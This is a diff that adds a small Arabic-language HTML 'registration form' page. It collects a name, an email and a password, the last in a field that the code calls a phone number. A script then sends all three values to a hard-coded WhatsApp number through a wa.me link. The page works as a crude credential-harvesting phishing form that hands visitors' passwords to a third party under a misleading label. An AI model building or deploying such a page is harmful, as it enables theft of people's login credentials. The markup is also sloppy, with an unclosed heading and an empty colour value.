@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://storage.googleapis.com/a1aa/image/907e0a86-1639-47c6-b27a-df620ae4c6d7.jpeg');
+            background-size: cover; 
+            background-position: center;
+            padding: 20px;
+        }
+        input[type="text"], input[type="tel"] {
+            width: 95%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #25D366; /* لون WhatsApp */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #128C7E;
+        }
+         .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: #;
+      padding: 20px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      height: 40px;
+    }
+
+    .language-select {
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 5px;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      margin: 20px 0;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="email"], input[type="password"], select {
+      width: 95%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .btn {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .btn:hover {
+      background-color: #0056b3;
+    }
+
+    .info {
+      font-size: 0.9rem;
+      color: #666;
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .info a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .info a:hover {
+      text-decoration: underline;
+    }
+ button {
+    background-color: #007bff;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    width: 100%;
+  }
+    </style>
+</head>
+<body> 
+     <div class="container">
+    <div class="header">
+<h1>Hello In Text Plane<input type="text" id="name" placeholder="Name" required>
+    <input type="text" id="email" placeholder="Your email" required>
+    <input type="tel" id="phone" placeholder="Your password" required>
+   
+    <button onclick="sendToWhatsApp()">next</button>
+</div>
+    <script>
+        function sendToWhatsApp() {
+            var name = document.getElementById("name").value;
+            var email = document.getElementById("email").value;
+            var phone = document.getElementById("phone").value;
+
+            // صياغة الرسالة
+            var message = `اسم: ${name}\nالبريد الإلكتروني: ${email}\nرقم الهاتف: ${phone}`;
+            var whatsappNumber = "201123961290"; // رقم الهاتف
+            var whatsappURL = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+
+            // توجيه المستخدم إلى WhatsApp
+            window.open(whatsappURL, '_blank');
+        }
+    </script>
+
+</body>
+</html>
